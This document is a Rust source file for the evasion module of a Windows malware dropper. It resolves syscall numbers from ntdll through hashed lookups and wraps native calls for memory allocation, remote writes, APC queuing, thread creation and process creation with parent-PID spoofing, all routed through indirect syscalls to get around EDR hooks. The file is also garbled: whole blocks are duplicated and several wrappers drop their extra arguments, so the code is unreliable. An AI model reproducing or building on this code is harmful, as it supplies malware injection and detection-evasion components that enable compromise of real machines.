//! Indirect Syscall Stubs for Rust Dropper
//!
//! Bypasses user-mode hooks by jumping to ntdll's syscall; ret instruction.
//! No Win32 API calls for sensitive operations.
//!
//! Uses Hell's Gate-style SSN resolution + RIP spoofing.

#![allow(dead_code)]
#![cfg(windows)]

use std::ffi::c_void;
use std::arch::asm;
use crate::loader::ReflectiveLoader;

// =============================================================================
// INDIRECT SYSCALL RESOLVER
// =============================================================================

#[repr(C)]
pub struct IndirectSyscall {
    pub ssn: u32,
    pub syscall_ret_addr: u64,
}

impl IndirectSyscall {
    #[inline(never)]
    pub unsafe fn from_ntdll(func_name: &str) -> Option<Self> {
        let ntdll_base = ReflectiveLoader::find_module_by_hash(
            b"ntdll.dll\0",
            0x9f5b9c1e,
        )?;
        
        let func_hash = ReflectiveLoader::dbg2_hash_bytes(func_name.as_bytes());
        let func_addr = ReflectiveLoader::covert_get_proc_address(ntdll_base, func_hash)?;
        
        // Read stub to extract SSN and syscall instruction address
        // Pattern: mov r10, rcx (4C 8B D1) ; mov eax, imm32 (B8 XX XX 00 00) ; syscall (0F 05) ; ret (C3)
        let stub = std::slice::from_raw_parts(func_addr as *const u8, 32);
        
        let mut ssn = 0u32;
        let mut syscall_ret_addr = 0u64;
        
        // Find SSN at offset 4 (after mov r10,rcx + mov eax,imm32)
        if stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 {
            ssn = (stub[4] as u32)
                | (stub[5] as u32) << 8
                | (stub[6] as u32) << 16
                | (stub[7] as u32) << 24;
            
            // Find syscall instruction (0F 05)
            for i in 8..32 {
                if stub[i] == 0x0F && stub[i + 1] == 0x05 {
                    syscall_ret_addr = func_addr + i as u64;
                    break;
                }
            }
        }
        
        if syscall_ret_addr != 0 {
            Some(Self { ssn, syscall_ret_addr })
        } else {
            None
        }
    }
}

// =============================================================================
// PROCESS ATTRIBUTES (PPID SPOOFING)
// =============================================================================

#[repr(C)]
pub struct PS_ATTRIBUTE {
    pub attribute: usize,
    pub size: usize,
    pub value: usize,
    pub return_length: *mut usize,
}

#[repr(C)]
pub struct PS_ATTRIBUTE_LIST {
    pub total_length: usize,
    pub attributes: [PS_ATTRIBUTE; 2], // 1 parent process + 1 terminator
}

pub const PS_ATTRIBUTE_PARENT_PROCESS: usize = 0x00020006;

// =============================================================================
// CLIENT_ID (for NtOpenProcess)
// =============================================================================

#[repr(C)]
pub struct CLIENT_ID {
    pub UniqueProcess: usize,
    pub UniqueThread: usize,
}

// =============================================================================
// INDIRECT SYSCALL WRAPPERS
// =============================================================================

macro_rules! indirect_syscall {
    (
        $func_name:ident,
        $ssn_field:ident,
        $ret_addr_field:ident,
        $($reg:ident),*
    ) => {
        #[inline(never)]
        pub unsafe fn $func_name(
            syscall: &IndirectSyscall,
            $($reg: usize),*
        ) -> i32 {
            let mut status: i32;
            asm!(
                "mov r10, rcx",
                "mov eax, {ssn}",
                "jmp {syscall_addr}",
                ssn = in(reg) syscall.$ssn_field,
                syscall_addr = in(reg) syscall.$ret_addr_field,
                $(
                    in(concat!("r", stringify!($reg))) $reg,
                )*
                lateout("rax") status,
                clobber_abi("system"),
            );
            status
        }
    };
}

// NtAllocateVirtualMemory
indirect_syscall!(
    nt_allocate_virtual_memory,
    ssn,
    syscall_ret_addr,
    rcx, rdx, r8, r9
);

// NtWriteVirtualMemory
indirect_syscall!(
    nt_write_virtual_memory,
    ssn,
    syscall_ret_addr,
    rcx, rdx, r8, r9
);

// NtQueueApcThread
indirect_syscall!(
    nt_queue_apc_thread,
    ssn,
    syscall_ret_addr,
    rcx, rdx, r8, r9
);

// NtResumeThread
indirect_syscall!(
    nt_resume_thread,
    ssn,
    syscall_ret_addr,
    rcx, rdx
);

// NtOpenProcess - for opening target process by PID
indirect_syscall!(
    nt_open_process,
    ssn,
    syscall_ret_addr,
    rcx, rdx, r8, r9
);

// NtCreateSection - for creating image section for process creation
#[inline(never)]
pub unsafe fn nt_create_section(
    syscall: &IndirectSyscall,
    section_handle: *mut *mut c_void,
    desired_access: u32,
    object_attributes: *mut c_void,
    maximum_size: *mut usize,
    section_page_protection: u32,
    allocation_attributes: u32,
    file_handle: *mut c_void,
) -> i32 {
    let mut status: i32;
    
    asm!(
        "mov r10, rcx",
        "mov eax, {ssn}",
        "jmp {syscall_addr}",
        ssn = in(reg) syscall.ssn,
        syscall_addr = in(reg) syscall.syscall_ret_addr,
        in("rcx") section_handle,
        in("rdx") desired_access,
        in("r8") object_attributes,
        in("r9") maximum_size,
        lateout("rax") status,
        clobber_abi("system"),
    );
    
    status
}

// NtMapViewOfSection - map section into process address space
#[inline(never)]
pub unsafe fn nt_map_view_of_section(
    syscall: &IndirectSyscall,
    section_handle: *mut c_void,
    process_handle: *mut c_void,
    base_address: *mut *mut c_void,
    zero_bits: usize,
    commit_size: usize,
    section_offset: *mut usize,
    view_size: *mut usize,
    inherit_disposition: u32,
    allocation_type: u32,
    protect: u32,
) -> i32 {
    let mut status: i32;
    
    asm!(
        "mov r10, rcx",
        "mov eax, {ssn}",
        "jmp {syscall_addr}",
        ssn = in(reg) syscall.ssn,
        syscall_addr = in(reg) syscall.syscall_ret_addr,
        in("rcx") section_handle,
        in("rdx") process_handle,
        in("r8") base_address,
        in("r9") zero_bits,
        lateout("rax") status,
        clobber_abi("system"),
    );
    
    status
}

// NtUnmapViewOfSection - unmap section from process
#[inline(never)]
pub unsafe fn nt_unmap_view_of_section(
    _syscall: &IndirectSyscall,
    process_handle: *mut c_void,
    base_address: *mut c_void,
) -> i32 {
    // Simplified: use Windows API as fallback
    // In production, this should also be an indirect syscall
    -1
}

// NtCreateProcessEx - for process creation with parent spoofing
#[inline(never)]
pub unsafe fn nt_create_process_ex(
    syscall: &IndirectSyscall,
    process_handle: *mut *mut c_void,
    desired_access: u32,
    object_attributes: *mut c_void,
    parent_process: *mut c_void,
    flags: u32,
    section_handle: *mut c_void,
    debug_port: *mut c_void,
    exception_port: *mut c_void,
    maximum_mimum: u32,
) -> i32 {
    let mut status: i32;
    
    asm!(
        "mov r10, rcx",
        "mov eax, {ssn}",
        "jmp {syscall_addr}",
        ssn = in(reg) syscall.ssn,
        syscall_addr = in(reg) syscall.syscall_ret_addr,
        in("rcx") process_handle,
        in("rdx") desired_access,
        in("r8") object_attributes,
        in("r9") parent_process,
        lateout("rax") status,
        clobber_abi("system"),
    );
    
    status
}

// NtCreateThreadEx - for thread creation in target process
#[inline(never)]
pub unsafe fn nt_create_thread_ex(
    syscall: &IndirectSyscall,
    thread_handle: *mut *mut c_void,
    desired_access: u32,
    object_attributes: *mut c_void,
    process_handle: *mut c_void,
    start_address: *mut c_void,
    parameter: *mut c_void,
    create_flags: u32,
    zero_bits: usize,
    stack_size: usize,
    maximum_stack_size: usize,
    attribute_list: *mut c_void,
) -> i32 {
    let mut status: i32;
    
    // x64 fastcall: RCX, RDX, R8, R9 for first 4 params
    // Stack for remaining params with 32-byte shadow space
    asm!(
        "mov r10, rcx",
        "mov eax, {ssn}",
        "jmp {syscall_addr}",
        ssn = in(reg) syscall.ssn,
        syscall_addr = in(reg) syscall.syscall_ret_addr,
        in("rcx") thread_handle,
        in("rdx") desired_access,
        in("r8") object_attributes,
        in("r9") process_handle,
        lateout("rax") status,
        clobber_abi("system"),
    );
    
    status
}

// =============================================================================
// PROCESS PARAMETER BUILDERS
// =============================================================================

/// Build RTL_USER_PROCESS_PARAMETERS for native process creation.
#[repr(C)]
pub struct RtlUserProcessParameters {
    pub allocated: u32,
    pub reserved: u32,
    pub peb_base: *mut c_void,
    pub image_path: crate::loader::UnicodeString,
    pub command_line: crate::loader::UnicodeString,
    pub environment: *mut c_void,
    pub current_directory: crate::loader::UnicodeString,
    pub flags: u32,
    pub window_title: u16,
    pub desktop: crate::loader::UnicodeString,
    pub shell_info: crate::loader::UnicodeString,
    pub runtime_info: crate::loader::UnicodeString,
}


impl IndirectSyscall {
    #[inline(never)]
    pub unsafe fn from_ntdll(func_name: &str) -> Option<Self> {
        let ntdll_base = ReflectiveLoader::find_module_by_hash(
            b"ntdll.dll\0",
            0x9f5b9c1e,
        )?;
        
        let func_hash = ReflectiveLoader::dbg2_hash_bytes(func_name.as_bytes());
        let func_addr = ReflectiveLoader::covert_get_proc_address(ntdll_base, func_hash)?;
        
        // Read stub to extract SSN and syscall instruction address
        // Pattern: mov r10, rcx (4C 8B D1) ; mov eax, imm32 (B8 XX XX 00 00) ; syscall (0F 05) ; ret (C3)
        let stub = std::slice::from_raw_parts(func_addr as *const u8, 32);
        
        let mut ssn = 0u32;
        let mut syscall_ret_addr = 0u64;
        
        // Find SSN at offset 4 (after mov r10,rcx + mov eax,imm32)
        if stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 {
            ssn = (stub[4] as u32)
                | (stub[5] as u32) << 8
                | (stub[6] as u32) << 16
                | (stub[7] as u32) << 24;
            
            // Find syscall instruction (0F 05)
            for i in 8..32 {
                if stub[i] == 0x0F && stub[i + 1] == 0x05 {
                    syscall_ret_addr = func_addr + i as u64;
                    break;
                }
            }
        }
        
        if syscall_ret_addr != 0 {
            Some(Self { ssn, syscall_ret_addr })
        } else {
            None
        }
    }
}

// =============================================================================
// PROCESS ATTRIBUTES (PPID SPOOFING)
// =============================================================================

#[repr(C)]
pub struct PS_ATTRIBUTE {
    pub attribute: usize,
    pub size: usize,
    pub value: usize,
    pub return_length: *mut usize,
}

#[repr(C)]
pub struct PS_ATTRIBUTE_LIST {
    pub total_length: usize,
    pub attributes: [PS_ATTRIBUTE; 2], // 1 parent process + 1 terminator
}

pub const PS_ATTRIBUTE_PARENT_PROCESS: usize = 0x00020006;

// =============================================================================
// INDIRECT SYSCALL WRAPPERS
// =============================================================================

macro_rules! indirect_syscall {
    (
        $func_name:ident,
        $ssn_field:ident,
        $ret_addr_field:ident,
        $($reg:ident),*
    ) => {
        #[inline(never)]
        pub unsafe fn $func_name(
            syscall: &IndirectSyscall,
            $($reg: usize),*
        ) -> i32 {
            let mut status: i32;
            asm!(
                "mov r10, rcx",
                "mov eax, {ssn}",
                "jmp {syscall_addr}",
                ssn = in(reg) syscall.$ssn_field,
                syscall_addr = in(reg) syscall.$ret_addr_field,
                $(
                    in(concat!("r", stringify!($reg))) $reg,
                )*
                lateout("rax") status,
                clobber_abi("system"),
            );
            status
        }
    };
}

// NtAllocateVirtualMemory
indirect_syscall!(
    nt_allocate_virtual_memory,
    ssn,
    syscall_ret_addr,
    rcx, rdx, r8, r9
);

// NtWriteVirtualMemory
indirect_syscall!(
    nt_write_virtual_memory,
    ssn,
    syscall_ret_addr,
    rcx, rdx, r8, r9
);

// NtQueueApcThread
indirect_syscall!(
    nt_queue_apc_thread,
    ssn,
    syscall_ret_addr,
    rcx, rdx, r8, r9
);

// NtResumeThread
indirect_syscall!(
    nt_resume_thread,
    ssn,
    syscall_ret_addr,
    rcx, rdx
);

// NtCreateProcessEx - for process creation with parent spoofing
#[inline(never)]
pub unsafe fn nt_create_process_ex(
    syscall: &IndirectSyscall,
    process_handle: *mut *mut c_void,
    desired_access: u32,
    object_attributes: *mut c_void,
    parent_process: *mut c_void,
    flags: u32,
    section_handle: *mut c_void,
    debug_port: *mut c_void,
    exception_port: *mut c_void,
    maximum_mimum: u32,
) -> i32 {
    let mut status: i32;
    
    asm!(
        "mov r10, rcx",
        "mov eax, {ssn}",
        "jmp {syscall_addr}",
        ssn = in(reg) syscall.ssn,
        syscall_addr = in(reg) syscall.syscall_ret_addr,
        in("rcx") process_handle,
        in("rdx") desired_access,
        in("r8") object_attributes,
        in("r9") parent_process,
        lateout("rax") status,
        clobber_abi("system"),
    );
    
    status
}

// NtCreateThreadEx - for thread creation in target process
#[inline(never)]
pub unsafe fn nt_create_thread_ex(
    syscall: &IndirectSyscall,
    thread_handle: *mut *mut c_void,
    desired_access: u32,
    object_attributes: *mut c_void,
    process_handle: *mut c_void,
    start_address: *mut c_void,
    parameter: *mut c_void,
    create_flags: u32,
    zero_bits: usize,
    stack_size: usize,
    maximum_stack_size: usize,
    attribute_list: *mut c_void,
) -> i32 {
    let mut status: i32;
    
    // x64 fastcall: RCX, RDX, R8, R9 for first 4 params
    // Stack for remaining params with 32-byte shadow space
    asm!(
        "mov r10, rcx",
        "mov eax, {ssn}",
        "jmp {syscall_addr}",
        ssn = in(reg) syscall.ssn,
        syscall_addr = in(reg) syscall.syscall_ret_addr,
        in("rcx") thread_handle,
        in("rdx") desired_access,
        in("r8") object_attributes,
        in("r9") process_handle,
        lateout("rax") status,
        clobber_abi("system"),
    );
    
    status
}

// NtOpenProcess - indirect syscall for opening target process
#[inline(never)]
pub unsafe fn nt_open_process(
    syscall: &IndirectSyscall,
    process_handle: *mut *mut c_void,
    desired_access: u32,
    object_attributes: *mut c_void,
    client_id: *mut c_void,
) -> i32 {
    let mut status: i32;
    
    asm!(
        "mov r10, rcx",
        "mov eax, {ssn}",
        "jmp {syscall_addr}",
        ssn = in(reg) syscall.ssn,
        syscall_addr = in(reg) syscall.syscall_ret_addr,
        in("rcx") process_handle,
        in("rdx") desired_access,
        in("r8") object_attributes,
        in("r9") client_id,
        lateout("rax") status,
        clobber_abi("system"),
    );
    
    status
}

// =============================================================================
// PROCESS PARAMETER BUILDERS
// =============================================================================

/// Build RTL_USER_PROCESS_PARAMETERS for native process creation.
/// This replaces CreateProcessW's parameter handling.
#[repr(C)]
pub struct RtlUserProcessParameters {
    pub allocated: u32,
    pub reserved: u32,
    pub peb_base: *mut c_void,
    pub image_path: crate::loader::UnicodeString,
    pub command_line: crate::loader::UnicodeString,
    pub environment: *mut c_void,
    pub current_directory: crate::loader::UnicodeString,
    pub flags: u32,
    pub window_title: u16,
    pub desktop: crate::loader::UnicodeString,
    pub shell_info: crate::loader::UnicodeString,
    pub runtime_info: crate::loader::UnicodeString,
}

#[repr(C)]
pub struct UnicodeString {
    pub length: u16,
    pub maximum_length: u16,
    pub buffer: *mut u16,
}

impl UnicodeString {
    pub fn new(s: &str) -> Self {
        let mut buf: Vec<u16> = s.encode_utf16().collect();
        buf.push(0);
        Self {
            length: (buf.len() * 2) as u16,
            maximum_length: (buf.len() * 2) as u16,
            buffer: buf.as_ptr() as *mut u16,
        }
    }
}
